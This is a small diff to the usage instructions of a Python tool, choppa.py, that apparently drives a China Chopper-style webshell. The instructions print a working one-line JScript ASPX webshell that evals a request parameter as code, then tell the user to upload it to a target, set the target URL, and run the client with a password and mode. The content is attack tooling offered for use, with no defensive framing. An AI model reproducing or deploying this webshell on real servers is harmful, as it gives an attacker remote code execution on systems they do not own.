@@ -25,7 +25,8 @@ INSTRUCTIONS:
 <script language="JScript" runat="server">function Page_Load(){eval(Request["Nonqjbexznaoynzrfuvfgbbyf"],"unsafe");}</script>
 
 2. Upload ASPX webshell on target
-3. python choppa.py -p Nonqjbexznaoynzrfuvfgbbyf -m MODE
+3. Modify URL to specify target server and webshell name in choppa.py
+4. Execute choppa.py with chosen mode number "python3 choppa.py -p Nonqjbexznaoynzrfuvfgbbyf -m 1"
 '''
 
 import sys
